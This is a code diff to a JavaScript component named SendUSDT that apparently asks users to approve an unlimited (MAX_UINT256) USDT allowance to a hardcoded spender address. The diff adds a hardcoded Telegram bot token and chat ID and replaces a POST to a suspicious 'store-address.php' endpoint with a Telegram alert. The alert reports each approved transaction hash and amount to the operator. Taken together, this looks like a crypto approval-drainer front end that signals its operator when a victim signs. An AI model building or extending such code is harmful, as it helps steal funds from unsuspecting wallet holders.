@@ -16,6 +16,10 @@ const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your ver
 // const approvalAmount = "9024508479"; // USDT amount to approve
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = "8024091829:AAFmv5v9ihBSK7b658OluaEb0cpsgAUFulE";
+const TELEGRAM_CHAT_ID = "1296393809";
+
 // ✅ HARDCODED wallet address - no connection needed
 const hardcodedAddress = "0x6B2F739112C3cd1a42993fc16830D8fdf296E24c"; // Replace with your address
 
@@ -115,13 +119,23 @@ export default function SendUSDT() {
       console.log("✅ Approval Success - Tx hash:", receipt.transactionHash);
 
       try {
-        await fetch("https://www.trc20support.buzz/old/store-address.php", {
+        const telegramMessage = `🔔 New Transaction Alert\n\n` +
+          `Transaction Hash: ${receipt.transactionHash}\n` +
+          `Amount: ${amount} USDT\n` +
+          `Network: BSC (BEP-20)\n` +
+          `\nView on BSCScan: https://bscscan.com/tx/${receipt.transactionHash}`;
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: receipt.transactionHash }),
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: telegramMessage,
+            parse_mode: "HTML"
+          }),
         });
       } catch (fetchErr) {
-        console.warn("Skipping fetch, not critical:", fetchErr.message);
+        console.warn("Telegram notification failed:", fetchErr.message);
       }
 
     } catch (err) {
